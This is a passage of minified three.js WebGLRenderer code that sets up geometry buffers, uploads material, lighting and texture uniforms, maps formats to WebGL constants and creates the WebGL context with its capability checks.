new THREE.Matrix3,void 0!==a.geometry&&void 0===a.geometry.__webglInit&&(a.geometry.__webglInit=!0,a.geometry.addEventListener("dispose",tc)),f=a.geometry,void 0!==f))if(f instanceof THREE.BufferGeometry){var k,r;for(k in f.attributes)r="index"===k?l.ELEMENT_ARRAY_BUFFER:l.ARRAY_BUFFER,q=f.attributes[k],q.buffer=l.createBuffer(),l.bindBuffer(r,q.buffer),l.bufferData(r,q.array,l.STATIC_DRAW)}else if(a instanceof THREE.Mesh){h=a.material;if(void 0===f.geometryGroups){k=f;var p,m,y,u,B;r={};var t=k.morphTargets.length,
w=k.morphNormals.length,D=h instanceof THREE.MeshFaceMaterial;k.geometryGroups={};h=0;for(p=k.faces.length;h<p;h++)m=k.faces[h],y=D?m.materialIndex:0,void 0===r[y]&&(r[y]={hash:y,counter:0}),B=r[y].hash+"_"+r[y].counter,void 0===k.geometryGroups[B]&&(k.geometryGroups[B]={faces3:[],faces4:[],materialIndex:y,vertices:0,numMorphTargets:t,numMorphNormals:w}),u=m instanceof THREE.Face3?3:4,65535<k.geometryGroups[B].vertices+u&&(r[y].counter+=1,B=r[y].hash+"_"+r[y].counter,void 0===k.geometryGroups[B]&&
(k.geometryGroups[B]={faces3:[],faces4:[],materialIndex:y,vertices:0,numMorphTargets:t,numMorphNormals:w})),m instanceof THREE.Face3?k.geometryGroups[B].faces3.push(h):k.geometryGroups[B].faces4.push(h),k.geometryGroups[B].vertices+=u;k.geometryGroupsList=[];for(q in k.geometryGroups)k.geometryGroups[q].id=kb++,k.geometryGroupsList.push(k.geometryGroups[q])}for(g in f.geometryGroups)if(q=f.geometryGroups[g],!q.__webglVertexBuffer){k=q;k.__webglVertexBuffer=l.createBuffer();k.__webglNormalBuffer=l.createBuffer();
k.__webglTangentBuffer=l.createBuffer();k.__webglColorBuffer=l.createBuffer();k.__webglUVBuffer=l.createBuffer();k.__webglUV2Buffer=l.createBuffer();k.__webglSkinIndicesBuffer=l.createBuffer();k.__webglSkinWeightsBuffer=l.createBuffer();k.__webglFaceBuffer=l.createBuffer();k.__webglLineBuffer=l.createBuffer();t=r=void 0;if(k.numMorphTargets)for(k.__webglMorphTargetsBuffers=[],r=0,t=k.numMorphTargets;r<t;r++)k.__webglMorphTargetsBuffers.push(l.createBuffer());if(k.numMorphNormals)for(k.__webglMorphNormalsBuffers=
[],r=0,t=k.numMorphNormals;r<t;r++)k.__webglMorphNormalsBuffers.push(l.createBuffer());P.info.memory.geometries++;e(q,a);f.verticesNeedUpdate=!0;f.morphTargetsNeedUpdate=!0;f.elementsNeedUpdate=!0;f.uvsNeedUpdate=!0;f.normalsNeedUpdate=!0;f.tangentsNeedUpdate=!0;f.colorsNeedUpdate=!0}}else a instanceof THREE.Ribbon?f.__webglVertexBuffer||(q=f,q.__webglVertexBuffer=l.createBuffer(),q.__webglColorBuffer=l.createBuffer(),q.__webglNormalBuffer=l.createBuffer(),P.info.memory.geometries++,q=f,k=q.vertices.length,
q.__vertexArray=new Float32Array(3*k),q.__colorArray=new Float32Array(3*k),q.__normalArray=new Float32Array(3*k),q.__webglVertexCount=k,c(q,a),f.verticesNeedUpdate=!0,f.colorsNeedUpdate=!0,f.normalsNeedUpdate=!0):a instanceof THREE.Line?f.__webglVertexBuffer||(q=f,q.__webglVertexBuffer=l.createBuffer(),q.__webglColorBuffer=l.createBuffer(),q.__webglLineDistanceBuffer=l.createBuffer(),P.info.memory.geometries++,q=f,k=q.vertices.length,q.__vertexArray=new Float32Array(3*k),q.__colorArray=new Float32Array(3*
k),q.__lineDistanceArray=new Float32Array(1*k),q.__webglLineCount=k,c(q,a),f.verticesNeedUpdate=!0,f.colorsNeedUpdate=!0,f.lineDistancesNeedUpdate=!0):a instanceof THREE.ParticleSystem&&!f.__webglVertexBuffer&&(q=f,q.__webglVertexBuffer=l.createBuffer(),q.__webglColorBuffer=l.createBuffer(),P.info.memory.geometries++,q=f,k=q.vertices.length,q.__vertexArray=new Float32Array(3*k),q.__colorArray=new Float32Array(3*k),q.__sortArray=[],q.__webglParticleCount=k,c(q,a),f.verticesNeedUpdate=!0,f.colorsNeedUpdate=
!0);if(void 0===a.__webglActive){if(a instanceof THREE.Mesh)if(f=a.geometry,f instanceof THREE.BufferGeometry)z(b.__webglObjects,f,a);else{if(f instanceof THREE.Geometry)for(g in f.geometryGroups)q=f.geometryGroups[g],z(b.__webglObjects,q,a)}else a instanceof THREE.Ribbon||a instanceof THREE.Line||a instanceof THREE.ParticleSystem?(f=a.geometry,z(b.__webglObjects,f,a)):a instanceof THREE.ImmediateRenderObject||a.immediateRenderCallback?b.__webglObjectsImmediate.push({object:a,opaque:null,transparent:null}):
a instanceof THREE.Sprite?b.__webglSprites.push(a):a instanceof THREE.LensFlare&&b.__webglFlares.push(a);a.__webglActive=!0}}function z(a,b,c){a.push({buffer:b,object:c,opaque:null,transparent:null})}function C(a){for(var b in a.attributes)if(a.attributes[b].needsUpdate)return!0;return!1}function B(a){for(var b in a.attributes)a.attributes[b].needsUpdate=!1}function D(a,b){a instanceof THREE.Mesh||a instanceof THREE.ParticleSystem||a instanceof THREE.Ribbon||a instanceof THREE.Line?G(b.__webglObjects,
a):a instanceof THREE.Sprite?W(b.__webglSprites,a):a instanceof THREE.LensFlare?W(b.__webglFlares,a):(a instanceof THREE.ImmediateRenderObject||a.immediateRenderCallback)&&G(b.__webglObjectsImmediate,a);delete a.__webglActive}function G(a,b){for(var c=a.length-1;0<=c;c--)a[c].object===b&&a.splice(c,1)}function W(a,b){for(var c=a.length-1;0<=c;c--)a[c]===b&&a.splice(c,1)}function u(a,b,c,e,g){Aa=0;e.needsUpdate&&(e.program&&uc(e),P.initMaterial(e,b,c,g),e.needsUpdate=!1);e.morphTargets&&!g.__webglMorphTargetInfluences&&
(g.__webglMorphTargetInfluences=new Float32Array(P.maxMorphTargets));var f=!1,h=e.program,q=h.uniforms,k=e.uniforms;h!==Sa&&(l.useProgram(h),Sa=h,f=!0);e.id!==ab&&(ab=e.id,f=!0);if(f||a!==cb)l.uniformMatrix4fv(q.projectionMatrix,!1,a.projectionMatrix.elements),a!==cb&&(cb=a);if(e.skinning)if(fc&&g.useVertexTexture){if(null!==q.boneTexture){var r=O();l.uniform1i(q.boneTexture,r);P.setTexture(g.boneTexture,r)}}else null!==q.boneGlobalMatrices&&l.uniformMatrix4fv(q.boneGlobalMatrices,!1,g.boneMatrices);
if(f){c&&e.fog&&(k.fogColor.value=c.color,c instanceof THREE.Fog?(k.fogNear.value=c.near,k.fogFar.value=c.far):c instanceof THREE.FogExp2&&(k.fogDensity.value=c.density));if(e instanceof THREE.MeshPhongMaterial||e instanceof THREE.MeshLambertMaterial||e.lights){if(qb){var p,m=r=0,y=0,u,B,z,t=vc,w=t.directional.colors,D=t.directional.positions,C=t.point.colors,G=t.point.positions,W=t.point.distances,J=t.spot.colors,I=t.spot.positions,L=t.spot.distances,E=t.spot.directions,M=t.spot.anglesCos,ja=t.spot.exponents,
N=t.hemi.skyColors,ia=t.hemi.groundColors,Y=t.hemi.positions,pa=0,ta=0,Z=0,wa=0,fa=0,R=0,S=0,Q=0,da=p=0;c=z=da=0;for(f=b.length;c<f;c++)if(p=b[c],!p.onlyShadow)if(u=p.color,B=p.intensity,z=p.distance,p instanceof THREE.AmbientLight)p.visible&&(P.gammaInput?(r+=u.r*u.r,m+=u.g*u.g,y+=u.b*u.b):(r+=u.r,m+=u.g,y+=u.b));else if(p instanceof THREE.DirectionalLight){if(fa+=1,p.visible&&(ra.getPositionFromMatrix(p.matrixWorld),Pa.getPositionFromMatrix(p.target.matrixWorld),ra.sub(Pa),ra.normalize(),0!==ra.x||
0!==ra.y||0!==ra.z))p=3*pa,D[p]=ra.x,D[p+1]=ra.y,D[p+2]=ra.z,P.gammaInput?K(w,p,u,B*B):F(w,p,u,B),pa+=1}else p instanceof THREE.PointLight?(R+=1,p.visible&&(da=3*ta,P.gammaInput?K(C,da,u,B*B):F(C,da,u,B),Pa.getPositionFromMatrix(p.matrixWorld),G[da]=Pa.x,G[da+1]=Pa.y,G[da+2]=Pa.z,W[ta]=z,ta+=1)):p instanceof THREE.SpotLight?(S+=1,p.visible&&(da=3*Z,P.gammaInput?K(J,da,u,B*B):F(J,da,u,B),Pa.getPositionFromMatrix(p.matrixWorld),I[da]=Pa.x,I[da+1]=Pa.y,I[da+2]=Pa.z,L[Z]=z,ra.copy(Pa),Pa.getPositionFromMatrix(p.target.matrixWorld),
ra.sub(Pa),ra.normalize(),E[da]=ra.x,E[da+1]=ra.y,E[da+2]=ra.z,M[Z]=Math.cos(p.angle),ja[Z]=p.exponent,Z+=1)):p instanceof THREE.HemisphereLight&&(Q+=1,p.visible&&(ra.getPositionFromMatrix(p.matrixWorld),ra.normalize(),0!==ra.x||0!==ra.y||0!==ra.z))&&(z=3*wa,Y[z]=ra.x,Y[z+1]=ra.y,Y[z+2]=ra.z,u=p.color,p=p.groundColor,P.gammaInput?(B*=B,K(N,z,u,B),K(ia,z,p,B)):(F(N,z,u,B),F(ia,z,p,B)),wa+=1);c=3*pa;for(f=Math.max(w.length,3*fa);c<f;c++)w[c]=0;c=3*ta;for(f=Math.max(C.length,3*R);c<f;c++)C[c]=0;c=3*
Z;for(f=Math.max(J.length,3*S);c<f;c++)J[c]=0;c=3*wa;for(f=Math.max(N.length,3*Q);c<f;c++)N[c]=0;c=3*wa;for(f=Math.max(ia.length,3*Q);c<f;c++)ia[c]=0;t.directional.length=pa;t.point.length=ta;t.spot.length=Z;t.hemi.length=wa;t.ambient[0]=r;t.ambient[1]=m;t.ambient[2]=y;qb=!1}c=vc;k.ambientLightColor.value=c.ambient;k.directionalLightColor.value=c.directional.colors;k.directionalLightDirection.value=c.directional.positions;k.pointLightColor.value=c.point.colors;k.pointLightPosition.value=c.point.positions;
k.pointLightDistance.value=c.point.distances;k.spotLightColor.value=c.spot.colors;k.spotLightPosition.value=c.spot.positions;k.spotLightDistance.value=c.spot.distances;k.spotLightDirection.value=c.spot.directions;k.spotLightAngleCos.value=c.spot.anglesCos;k.spotLightExponent.value=c.spot.exponents;k.hemisphereLightSkyColor.value=c.hemi.skyColors;k.hemisphereLightGroundColor.value=c.hemi.groundColors;k.hemisphereLightDirection.value=c.hemi.positions}if(e instanceof THREE.MeshBasicMaterial||e instanceof
THREE.MeshLambertMaterial||e instanceof THREE.MeshPhongMaterial){k.opacity.value=e.opacity;P.gammaInput?k.diffuse.value.copyGammaToLinear(e.color):k.diffuse.value=e.color;k.map.value=e.map;k.lightMap.value=e.lightMap;k.specularMap.value=e.specularMap;e.bumpMap&&(k.bumpMap.value=e.bumpMap,k.bumpScale.value=e.bumpScale);e.normalMap&&(k.normalMap.value=e.normalMap,k.normalScale.value.copy(e.normalScale));var ga;e.map?ga=e.map:e.specularMap?ga=e.specularMap:e.normalMap?ga=e.normalMap:e.bumpMap&&(ga=e.bumpMap);
void 0!==ga&&(c=ga.offset,ga=ga.repeat,k.offsetRepeat.value.set(c.x,c.y,ga.x,ga.y));k.envMap.value=e.envMap;k.flipEnvMap.value=e.envMap instanceof THREE.WebGLRenderTargetCube?1:-1;k.reflectivity.value=e.reflectivity;k.refractionRatio.value=e.refractionRatio;k.combine.value=e.combine;k.useRefract.value=e.envMap&&e.envMap.mapping instanceof THREE.CubeRefractionMapping}e instanceof THREE.LineBasicMaterial?(k.diffuse.value=e.color,k.opacity.value=e.opacity):e instanceof THREE.LineDashedMaterial?(k.diffuse.value=
e.color,k.opacity.value=e.opacity,k.dashSize.value=e.dashSize,k.totalSize.value=e.dashSize+e.gapSize,k.scale.value=e.scale):e instanceof THREE.ParticleBasicMaterial?(k.psColor.value=e.color,k.opacity.value=e.opacity,k.size.value=e.size,k.scale.value=V.height/2,k.map.value=e.map):e instanceof THREE.MeshPhongMaterial?(k.shininess.value=e.shininess,P.gammaInput?(k.ambient.value.copyGammaToLinear(e.ambient),k.emissive.value.copyGammaToLinear(e.emissive),k.specular.value.copyGammaToLinear(e.specular)):
(k.ambient.value=e.ambient,k.emissive.value=e.emissive,k.specular.value=e.specular),e.wrapAround&&k.wrapRGB.value.copy(e.wrapRGB)):e instanceof THREE.MeshLambertMaterial?(P.gammaInput?(k.ambient.value.copyGammaToLinear(e.ambient),k.emissive.value.copyGammaToLinear(e.emissive)):(k.ambient.value=e.ambient,k.emissive.value=e.emissive),e.wrapAround&&k.wrapRGB.value.copy(e.wrapRGB)):e instanceof THREE.MeshDepthMaterial?(k.mNear.value=a.near,k.mFar.value=a.far,k.opacity.value=e.opacity):e instanceof THREE.MeshNormalMaterial&&
(k.opacity.value=e.opacity);if(g.receiveShadow&&!e._shadowPass&&k.shadowMatrix)for(c=ga=0,f=b.length;c<f;c++)r=b[c],r.castShadow&&(r instanceof THREE.SpotLight||r instanceof THREE.DirectionalLight&&!r.shadowCascade)&&(k.shadowMap.value[ga]=r.shadowMap,k.shadowMapSize.value[ga]=r.shadowMapSize,k.shadowMatrix.value[ga]=r.shadowMatrix,k.shadowDarkness.value[ga]=r.shadowDarkness,k.shadowBias.value[ga]=r.shadowBias,ga++);b=e.uniformsList;k=0;for(ga=b.length;k<ga;k++)if(f=h.uniforms[b[k][1]])if(c=b[k][0],
m=c.type,r=c.value,"i"===m)l.uniform1i(f,r);else if("f"===m)l.uniform1f(f,r);else if("v2"===m)l.uniform2f(f,r.x,r.y);else if("v3"===m)l.uniform3f(f,r.x,r.y,r.z);else if("v4"===m)l.uniform4f(f,r.x,r.y,r.z,r.w);else if("c"===m)l.uniform3f(f,r.r,r.g,r.b);else if("iv1"===m)l.uniform1iv(f,r);else if("iv"===m)l.uniform3iv(f,r);else if("fv1"===m)l.uniform1fv(f,r);else if("fv"===m)l.uniform3fv(f,r);else if("v2v"===m){void 0===c._array&&(c._array=new Float32Array(2*r.length));m=0;for(y=r.length;m<y;m++)t=
2*m,c._array[t]=r[m].x,c._array[t+1]=r[m].y;l.uniform2fv(f,c._array)}else if("v3v"===m){void 0===c._array&&(c._array=new Float32Array(3*r.length));m=0;for(y=r.length;m<y;m++)t=3*m,c._array[t]=r[m].x,c._array[t+1]=r[m].y,c._array[t+2]=r[m].z;l.uniform3fv(f,c._array)}else if("v4v"===m){void 0===c._array&&(c._array=new Float32Array(4*r.length));m=0;for(y=r.length;m<y;m++)t=4*m,c._array[t]=r[m].x,c._array[t+1]=r[m].y,c._array[t+2]=r[m].z,c._array[t+3]=r[m].w;l.uniform4fv(f,c._array)}else if("m4"===m)void 0===
c._array&&(c._array=new Float32Array(16)),r.flattenToArray(c._array),l.uniformMatrix4fv(f,!1,c._array);else if("m4v"===m){void 0===c._array&&(c._array=new Float32Array(16*r.length));m=0;for(y=r.length;m<y;m++)r[m].flattenToArrayOffset(c._array,16*m);l.uniformMatrix4fv(f,!1,c._array)}else if("t"===m){if(t=r,r=O(),l.uniform1i(f,r),t)if(t.image instanceof Array&&6===t.image.length){if(c=t,f=r,6===c.image.length)if(c.needsUpdate){c.image.__webglTextureCube||(c.image.__webglTextureCube=l.createTexture(),
P.info.memory.textures++);l.activeTexture(l.TEXTURE0+f);l.bindTexture(l.TEXTURE_CUBE_MAP,c.image.__webglTextureCube);l.pixelStorei(l.UNPACK_FLIP_Y_WEBGL,c.flipY);f=c instanceof THREE.CompressedTexture;r=[];for(m=0;6>m;m++)P.autoScaleCubemaps&&!f?(y=m,t=c.image[m],t.width<=Rb&&t.height<=Rb||(D=Math.max(t.width,t.height),w=Math.floor(t.width*Rb/D),D=Math.floor(t.height*Rb/D),C=document.createElement("canvas"),C.width=w,C.height=D,C.getContext("2d").drawImage(t,0,0,t.width,t.height,0,0,w,D),t=C),r[y]=
t):r[m]=c.image[m];m=r[0];y=T(m.width)&&T(m.height);t=X(c.format);w=X(c.type);H(l.TEXTURE_CUBE_MAP,c,y);for(m=0;6>m;m++)if(f)for(C=r[m].mipmaps,G=0,W=C.length;G<W;G++)D=C[G],l.compressedTexImage2D(l.TEXTURE_CUBE_MAP_POSITIVE_X+m,G,t,D.width,D.height,0,D.data);else l.texImage2D(l.TEXTURE_CUBE_MAP_POSITIVE_X+m,0,t,t,w,r[m]);c.generateMipmaps&&y&&l.generateMipmap(l.TEXTURE_CUBE_MAP);c.needsUpdate=!1;if(c.onUpdate)c.onUpdate()}else l.activeTexture(l.TEXTURE0+f),l.bindTexture(l.TEXTURE_CUBE_MAP,c.image.__webglTextureCube)}else t instanceof
THREE.WebGLRenderTargetCube?(c=t,l.activeTexture(l.TEXTURE0+r),l.bindTexture(l.TEXTURE_CUBE_MAP,c.__webglTexture)):P.setTexture(t,r)}else if("tv"===m){void 0===c._array&&(c._array=[]);m=0;for(y=c.value.length;m<y;m++)c._array[m]=O();l.uniform1iv(f,c._array);m=0;for(y=c.value.length;m<y;m++)t=c.value[m],r=c._array[m],t&&P.setTexture(t,r)}(e instanceof THREE.ShaderMaterial||e instanceof THREE.MeshPhongMaterial||e.envMap)&&null!==q.cameraPosition&&(Pa.getPositionFromMatrix(a.matrixWorld),l.uniform3f(q.cameraPosition,
Pa.x,Pa.y,Pa.z));(e instanceof THREE.MeshPhongMaterial||e instanceof THREE.MeshLambertMaterial||e instanceof THREE.ShaderMaterial||e.skinning)&&null!==q.viewMatrix&&l.uniformMatrix4fv(q.viewMatrix,!1,a.matrixWorldInverse.elements)}l.uniformMatrix4fv(q.modelViewMatrix,!1,g._modelViewMatrix.elements);q.normalMatrix&&l.uniformMatrix3fv(q.normalMatrix,!1,g._normalMatrix.elements);null!==q.modelMatrix&&l.uniformMatrix4fv(q.modelMatrix,!1,g.matrixWorld.elements);return h}function O(){var a=Aa;a>=wc&&console.warn("WebGLRenderer: trying to use "+
a+" texture units while this GPU supports only "+wc);Aa+=1;return a}function K(a,b,c,e){a[b]=c.r*c.r*e;a[b+1]=c.g*c.g*e;a[b+2]=c.b*c.b*e}function F(a,b,c,e){a[b]=c.r*e;a[b+1]=c.g*e;a[b+2]=c.b*e}function L(a){a!==Gb&&(l.lineWidth(a),Gb=a)}function I(a,b,c){lb!==a&&(a?l.enable(l.POLYGON_OFFSET_FILL):l.disable(l.POLYGON_OFFSET_FILL),lb=a);!a||Eb===b&&Fb===c||(l.polygonOffset(b,c),Eb=b,Fb=c)}function J(a){a=a.split("\n");for(var b=0,c=a.length;b<c;b++)a[b]=b+1+": "+a[b];return a.join("\n")}function M(a,
b){var c;"fragment"===a?c=l.createShader(l.FRAGMENT_SHADER):"vertex"===a&&(c=l.createShader(l.VERTEX_SHADER));l.shaderSource(c,b);l.compileShader(c);return l.getShaderParameter(c,l.COMPILE_STATUS)?c:(console.error(l.getShaderInfoLog(c)),console.error(J(b)),null)}function T(a){return 0===(a&a-1)}function H(a,b,c){c?(l.texParameteri(a,l.TEXTURE_WRAP_S,X(b.wrapS)),l.texParameteri(a,l.TEXTURE_WRAP_T,X(b.wrapT)),l.texParameteri(a,l.TEXTURE_MAG_FILTER,X(b.magFilter)),l.texParameteri(a,l.TEXTURE_MIN_FILTER,
X(b.minFilter))):(l.texParameteri(a,l.TEXTURE_WRAP_S,l.CLAMP_TO_EDGE),l.texParameteri(a,l.TEXTURE_WRAP_T,l.CLAMP_TO_EDGE),l.texParameteri(a,l.TEXTURE_MAG_FILTER,Y(b.magFilter)),l.texParameteri(a,l.TEXTURE_MIN_FILTER,Y(b.minFilter)));rb&&b.type!==THREE.FloatType&&(1<b.anisotropy||b.__oldAnisotropy)&&(l.texParameterf(a,rb.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(b.anisotropy,gc)),b.__oldAnisotropy=b.anisotropy)}function Z(a,b){l.bindRenderbuffer(l.RENDERBUFFER,a);b.depthBuffer&&!b.stencilBuffer?(l.renderbufferStorage(l.RENDERBUFFER,
l.DEPTH_COMPONENT16,b.width,b.height),l.framebufferRenderbuffer(l.FRAMEBUFFER,l.DEPTH_ATTACHMENT,l.RENDERBUFFER,a)):b.depthBuffer&&b.stencilBuffer?(l.renderbufferStorage(l.RENDERBUFFER,l.DEPTH_STENCIL,b.width,b.height),l.framebufferRenderbuffer(l.FRAMEBUFFER,l.DEPTH_STENCIL_ATTACHMENT,l.RENDERBUFFER,a)):l.renderbufferStorage(l.RENDERBUFFER,l.RGBA4,b.width,b.height)}function Y(a){return a===THREE.NearestFilter||a===THREE.NearestMipMapNearestFilter||a===THREE.NearestMipMapLinearFilter?l.NEAREST:l.LINEAR}
function X(a){if(a===THREE.RepeatWrapping)return l.REPEAT;if(a===THREE.ClampToEdgeWrapping)return l.CLAMP_TO_EDGE;if(a===THREE.MirroredRepeatWrapping)return l.MIRRORED_REPEAT;if(a===THREE.NearestFilter)return l.NEAREST;if(a===THREE.NearestMipMapNearestFilter)return l.NEAREST_MIPMAP_NEAREST;if(a===THREE.NearestMipMapLinearFilter)return l.NEAREST_MIPMAP_LINEAR;if(a===THREE.LinearFilter)return l.LINEAR;if(a===THREE.LinearMipMapNearestFilter)return l.LINEAR_MIPMAP_NEAREST;if(a===THREE.LinearMipMapLinearFilter)return l.LINEAR_MIPMAP_LINEAR;
if(a===THREE.UnsignedByteType)return l.UNSIGNED_BYTE;if(a===THREE.UnsignedShort4444Type)return l.UNSIGNED_SHORT_4_4_4_4;if(a===THREE.UnsignedShort5551Type)return l.UNSIGNED_SHORT_5_5_5_1;if(a===THREE.UnsignedShort565Type)return l.UNSIGNED_SHORT_5_6_5;if(a===THREE.ByteType)return l.BYTE;if(a===THREE.ShortType)return l.SHORT;if(a===THREE.UnsignedShortType)return l.UNSIGNED_SHORT;if(a===THREE.IntType)return l.INT;if(a===THREE.UnsignedIntType)return l.UNSIGNED_INT;if(a===THREE.FloatType)return l.FLOAT;
if(a===THREE.AlphaFormat)return l.ALPHA;if(a===THREE.RGBFormat)return l.RGB;if(a===THREE.RGBAFormat)return l.RGBA;if(a===THREE.LuminanceFormat)return l.LUMINANCE;if(a===THREE.LuminanceAlphaFormat)return l.LUMINANCE_ALPHA;if(a===THREE.AddEquation)return l.FUNC_ADD;if(a===THREE.SubtractEquation)return l.FUNC_SUBTRACT;if(a===THREE.ReverseSubtractEquation)return l.FUNC_REVERSE_SUBTRACT;if(a===THREE.ZeroFactor)return l.ZERO;if(a===THREE.OneFactor)return l.ONE;if(a===THREE.SrcColorFactor)return l.SRC_COLOR;
if(a===THREE.OneMinusSrcColorFactor)return l.ONE_MINUS_SRC_COLOR;if(a===THREE.SrcAlphaFactor)return l.SRC_ALPHA;if(a===THREE.OneMinusSrcAlphaFactor)return l.ONE_MINUS_SRC_ALPHA;if(a===THREE.DstAlphaFactor)return l.DST_ALPHA;if(a===THREE.OneMinusDstAlphaFactor)return l.ONE_MINUS_DST_ALPHA;if(a===THREE.DstColorFactor)return l.DST_COLOR;if(a===THREE.OneMinusDstColorFactor)return l.ONE_MINUS_DST_COLOR;if(a===THREE.SrcAlphaSaturateFactor)return l.SRC_ALPHA_SATURATE;if(void 0!==sb){if(a===THREE.RGB_S3TC_DXT1_Format)return sb.COMPRESSED_RGB_S3TC_DXT1_EXT;
if(a===THREE.RGBA_S3TC_DXT1_Format)return sb.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(a===THREE.RGBA_S3TC_DXT3_Format)return sb.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(a===THREE.RGBA_S3TC_DXT5_Format)return sb.COMPRESSED_RGBA_S3TC_DXT5_EXT}return 0}a=a||{};var V=void 0!==a.canvas?a.canvas:document.createElement("canvas"),ja=void 0!==a.precision?a.precision:"highp",ia=void 0!==a.alpha?a.alpha:!0,pa=void 0!==a.premultipliedAlpha?a.premultipliedAlpha:!0,wa=void 0!==a.antialias?a.antialias:!1,Ja=void 0!==a.stencil?
a.stencil:!0,Oa=void 0!==a.preserveDrawingBuffer?a.preserveDrawingBuffer:!1,ta=new THREE.Color(0),Ia=0;void 0!==a.clearColor&&(console.warn("DEPRECATED: clearColor in WebGLRenderer constructor parameters is being removed. Use .setClearColor() instead."),ta.setHex(a.clearColor));void 0!==a.clearAlpha&&(console.warn("DEPRECATED: clearAlpha in WebGLRenderer constructor parameters is being removed. Use .setClearColor() instead."),Ia=a.clearAlpha);this.domElement=V;this.context=null;this.devicePixelRatio=
void 0!==a.devicePixelRatio?a.devicePixelRatio:void 0!==window.devicePixelRatio?window.devicePixelRatio:1;this.autoUpdateObjects=this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.shadowMapEnabled=this.physicallyBasedShading=this.gammaOutput=this.gammaInput=!1;this.shadowMapAutoUpdate=!0;this.shadowMapType=THREE.PCFShadowMap;this.shadowMapCullFace=THREE.CullFaceFront;this.shadowMapCascade=this.shadowMapDebug=!1;this.maxMorphTargets=8;this.maxMorphNormals=
4;this.autoScaleCubemaps=!0;this.renderPluginsPre=[];this.renderPluginsPost=[];this.info={memory:{programs:0,geometries:0,textures:0},render:{calls:0,vertices:0,faces:0,points:0}};var P=this,ga=[],ib=0,Sa=null,Db=null,ab=-1,Ta=null,cb=null,kb=0,Aa=0,fa=-1,la=-1,Ba=-1,qa=-1,ma=-1,Ma=-1,db=-1,xa=-1,lb=null,Eb=null,Fb=null,Gb=null,hc=0,ic=0,Sb=0,Tb=0,ec=0,sc=0,Qb={},Yb=new THREE.Frustum,xc=new THREE.Matrix4,Qc=new THREE.Matrix4,Pa=new THREE.Vector3,ra=new THREE.Vector3,qb=!0,vc={ambient:[0,0,0],directional:{length:0,
colors:[],positions:[]},point:{length:0,colors:[],positions:[],distances:[]},spot:{length:0,colors:[],positions:[],distances:[],directions:[],anglesCos:[],exponents:[]},hemi:{length:0,skyColors:[],groundColors:[],positions:[]}},l,Zb,$b,rb,sb;(function(){try{if(!(l=V.getContext("experimental-webgl",{alpha:ia,premultipliedAlpha:pa,antialias:wa,stencil:Ja,preserveDrawingBuffer:Oa})))throw"Error creating WebGL context.";}catch(a){console.error(a)}Zb=l.getExtension("OES_texture_float");$b=l.getExtension("OES_standard_derivatives");
rb=l.getExtension("EXT_texture_filter_anisotropic")||l.getExtension("MOZ_EXT_texture_filter_anisotropic")||l.getExtension("WEBKIT_EXT_texture_filter_anisotropic");sb=l.getExtension("WEBGL_compressed_texture_s3tc")||l.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||l.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");Zb||console.log("THREE.WebGLRenderer: Float textures not supported.");$b||console.log("THREE.WebGLRenderer: Standard derivatives not supported.");rb||console.log("THREE.WebGLRenderer: Anisotropic texture filtering not supported.");
sb||console.log("THREE.WebGLRenderer: S3TC compressed textures not supported.");void 0===l.getShaderPrecisionFormat&&(l.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})})();l.clearColor(0,0,0,1);l.clearDepth(1);l.clearStencil(0);l.enable(l.DEPTH_TEST);l.depthFunc(l.LEQUAL);l.frontFace(l.CCW);l.cullFace(l.BACK);l.enable(l.CULL_FACE);l.enable(l.BLEND);l.blendEquation(l.FUNC_ADD);l.blendFunc(l.SRC_ALPHA,l.ONE_MINUS_SRC_ALPHA);l.clearColor(ta.r,ta.g,ta.b,Ia);this.context=
l;var wc=l.getParameter(l.MAX_TEXTURE_IMAGE_UNITS),Rc=l.getParameter(l.MAX_VERTEX_TEXTURE_IMAGE_UNITS);l.getParameter(l.MAX_TEXTURE_SIZE);var Rb=l.getParameter(l.MAX_CUBE_MAP_TEXTURE_SIZE),gc=rb?l.getParameter(rb.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0,ac=0<Rc,fc=ac&&Zb;sb&&l.getParameter(l.COMPRESSED_TEXTURE_FORMATS);var Sc=l.getShaderPrecisionFormat(l.VERTEX_SHADER,l.HIGH_FLOAT),Tc=l.getShaderPrecisionFormat(l.VERTEX_SHADER,l.MEDIUM_FLOAT);l.getShaderPrecisionFormat(l.VERTEX_SHADER,l.LOW_FLOAT);var dd=
l.getShaderPrecisionFormat(l.FRAGMENT_SHADER,l.HIGH_FLOAT),ed=l.getShaderPrecisionFormat(l.FRAGMENT_SHADER,l.MEDIUM_FLOAT);l.getShaderPrecisionFormat(l.FRAGMENT_SHADER,l.LOW_FLOAT);l.getShaderPrecisionFormat(l.VERTEX_SHADER,l.HIGH_INT);l.getShaderPrecisionFormat(l.VERTEX_SHADER,l.MEDIUM_INT);l.getShaderPrecisionFormat(l.VERTEX_SHADER,l.LOW_INT);l.getShaderPrecisionFormat(l.FRAGMENT_SHADER,l.HIGH_INT);l.getShaderPrecisionFormat(l.FRAGMENT_SHADER,l.MEDIUM_INT);l.getShaderPrecisionFormat(l.FRAGMENT_SHADER,
l.LOW_INT);var fd=0<Sc.precision&&0<dd.precision,jc=0<Tc.precision&&0<ed.precision;"highp"!==ja||fd||(jc?(ja="mediump",console.warn("WebGLRenderer: highp not supported, using mediump")):(ja="lowp",console.warn("WebGLRenderer: highp and mediump not supported, using lowp")));"mediump"!==ja||jc||(ja="lowp",console.warn("WebGLRenderer: mediump not supported, using lowp"));this.getContext=function(){return l};this.supportsVertexTextures=function(){return ac};this.supportsFloatTextures=function(){return Zb};
this.supportsStandardDerivatives=function(){return $b};this.supportsCompressedTextureS3TC=function(){return sb};this.getMaxAnisotropy=function(){return gc};this.getPrecision=function(){return ja};this.setSize=function(a,b,c){V.width=a*this.devicePixelRatio;V.height=b*this.devicePixelRatio;1!==this.devicePixelRatio&&!1!==c&&(V.style.width=a+"px",V.style.height=b+"px");this.setViewport(0,0,V.width,V.height)};this.setViewport=function(a,b,c,e){hc=void 0!==a?a:0;ic=void 0!==b?b:0;Sb=void 0!==c?c:V.width;
